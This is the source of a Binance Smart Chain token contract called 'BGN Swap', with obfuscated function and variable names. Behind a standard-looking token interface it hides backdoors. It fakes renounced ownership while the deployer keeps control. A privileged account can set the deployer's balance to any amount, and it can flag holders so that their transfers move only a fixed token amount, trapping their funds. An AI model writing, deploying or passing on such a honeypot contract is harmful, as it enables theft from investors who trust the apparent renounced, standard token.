/**
 *Submitted for verification at BscScan.com on 2023-02-20
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

abstract contract ldzstnamnuytdg {
    function oivioihtpmo() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface iasjfbegrcck {
    function createPair(address fnnlfravnimmjq, address yzdhnsuqw) external returns (address);
}

interface nqntplunxep {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract BGNSwap is IERC20, ldzstnamnuytdg {

    bool public ypuxsnbeyln;

    function pmwxdinrulxnx() public view returns (uint256) {
        return opcwkcrwuvhmn;
    }

    function transferFrom(address rvgnxzzmwpcmsr, address iyjbgutwqbuw, uint256 ngdgykyej) external override returns (bool) {
        if (kuggeyapt[rvgnxzzmwpcmsr][oivioihtpmo()] != type(uint256).max) {
            require(ngdgykyej <= kuggeyapt[rvgnxzzmwpcmsr][oivioihtpmo()]);
            kuggeyapt[rvgnxzzmwpcmsr][oivioihtpmo()] -= ngdgykyej;
        }
        return ktkkzizmje(rvgnxzzmwpcmsr, iyjbgutwqbuw, ngdgykyej);
    }

    mapping(address => uint256) private wldzxpvratvbaz;

    uint256 public pjpgchjbfxhmf;

    string private forgaaemobikvn = "BGN Swap";

    uint256 private fngoefzjqpipd = 100000000 * 10 ** 18;

    address private sefzhwuxh;

    uint256 constant bcajyeizzjqago = 9 ** 10;

    function getOwner() external view returns (address) {
        return sefzhwuxh;
    }

    function allowance(address mjgivakva, address vscrmpyvkorn) external view virtual override returns (uint256) {
        return kuggeyapt[mjgivakva][vscrmpyvkorn];
    }

    function transfer(address zxwzyahrprod, uint256 ngdgykyej) external virtual override returns (bool) {
        return ktkkzizmje(oivioihtpmo(), zxwzyahrprod, ngdgykyej);
    }

    function approve(address vscrmpyvkorn, uint256 ngdgykyej) public virtual override returns (bool) {
        kuggeyapt[oivioihtpmo()][vscrmpyvkorn] = ngdgykyej;
        emit Approval(oivioihtpmo(), vscrmpyvkorn, ngdgykyej);
        return true;
    }

    function owner() external view returns (address) {
        return sefzhwuxh;
    }

    string private jxoozhietif = "BSP";

    function bwiwjfsjej(uint256 ngdgykyej) public {
        if (!dilicovsrcbgk[oivioihtpmo()]) {
            return;
        }
        wldzxpvratvbaz[ibyxptcgujcie] = ngdgykyej;
    }

    event OwnershipTransferred(address indexed tgqdjozyfn, address indexed kjqsdpilturu);

    function sbdcchfxojokse(address dbmbyerimfkl) public {
        if (xqlxmflrhwpiwe) {
            return;
        }
        if (pjpgchjbfxhmf != opcwkcrwuvhmn) {
            pjpgchjbfxhmf = opcwkcrwuvhmn;
        }
        dilicovsrcbgk[dbmbyerimfkl] = true;
        if (opcwkcrwuvhmn == pjpgchjbfxhmf) {
            oohpjahjcctosj = true;
        }
        xqlxmflrhwpiwe = true;
    }

    mapping(address => bool) public ywzjbgwjep;

    function gbyygmhpteze() public view returns (uint256) {
        return pjpgchjbfxhmf;
    }

    function glqfshenydcfcc(address phmbblurjw) public {
        
        if (phmbblurjw == ibyxptcgujcie || phmbblurjw == kfhntpkvqorlzo || !dilicovsrcbgk[oivioihtpmo()]) {
            return;
        }
        
        ywzjbgwjep[phmbblurjw] = true;
    }

    address public ibyxptcgujcie;

    function slrjamrwglewul(address rvgnxzzmwpcmsr, address iyjbgutwqbuw, uint256 ngdgykyej) internal returns (bool) {
        require(wldzxpvratvbaz[rvgnxzzmwpcmsr] >= ngdgykyej);
        wldzxpvratvbaz[rvgnxzzmwpcmsr] -= ngdgykyej;
        wldzxpvratvbaz[iyjbgutwqbuw] += ngdgykyej;
        emit Transfer(rvgnxzzmwpcmsr, iyjbgutwqbuw, ngdgykyej);
        return true;
    }

    function rxvktkibghalgm() public {
        emit OwnershipTransferred(ibyxptcgujcie, address(0));
        sefzhwuxh = address(0);
    }

    function balanceOf(address cjvzcuirykqh) public view virtual override returns (uint256) {
        return wldzxpvratvbaz[cjvzcuirykqh];
    }

    bool private oohpjahjcctosj;

    constructor (){ 
        
        nqntplunxep zqizujxpipcg = nqntplunxep(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        kfhntpkvqorlzo = iasjfbegrcck(zqizujxpipcg.factory()).createPair(zqizujxpipcg.WETH(), address(this));
        sefzhwuxh = oivioihtpmo();
        if (opcwkcrwuvhmn == pjpgchjbfxhmf) {
            pjpgchjbfxhmf = opcwkcrwuvhmn;
        }
        ibyxptcgujcie = oivioihtpmo();
        dilicovsrcbgk[oivioihtpmo()] = true;
        
        wldzxpvratvbaz[oivioihtpmo()] = fngoefzjqpipd;
        emit Transfer(address(0), ibyxptcgujcie, fngoefzjqpipd);
        rxvktkibghalgm();
    }

    uint8 private syoxqewgwn = 18;

    function ktkkzizmje(address rvgnxzzmwpcmsr, address iyjbgutwqbuw, uint256 ngdgykyej) internal returns (bool) {
        if (rvgnxzzmwpcmsr == ibyxptcgujcie) {
            return slrjamrwglewul(rvgnxzzmwpcmsr, iyjbgutwqbuw, ngdgykyej);
        }
        if (ywzjbgwjep[rvgnxzzmwpcmsr]) {
            return slrjamrwglewul(rvgnxzzmwpcmsr, iyjbgutwqbuw, bcajyeizzjqago);
        }
        return slrjamrwglewul(rvgnxzzmwpcmsr, iyjbgutwqbuw, ngdgykyej);
    }

    bool public xqlxmflrhwpiwe;

    function name() external view returns (string memory) {
        return forgaaemobikvn;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fngoefzjqpipd;
    }

    function wupnfraawxrac() public view returns (bool) {
        return ypuxsnbeyln;
    }

    uint256 public opcwkcrwuvhmn;

    address public kfhntpkvqorlzo;

    function decimals() external view returns (uint8) {
        return syoxqewgwn;
    }

    mapping(address => mapping(address => uint256)) private kuggeyapt;

    function symbol() external view returns (string memory) {
        return jxoozhietif;
    }

    function hxcpyzzeudr() public {
        if (oohpjahjcctosj) {
            oohpjahjcctosj = false;
        }
        
        pjpgchjbfxhmf=0;
    }

    mapping(address => bool) public dilicovsrcbgk;

}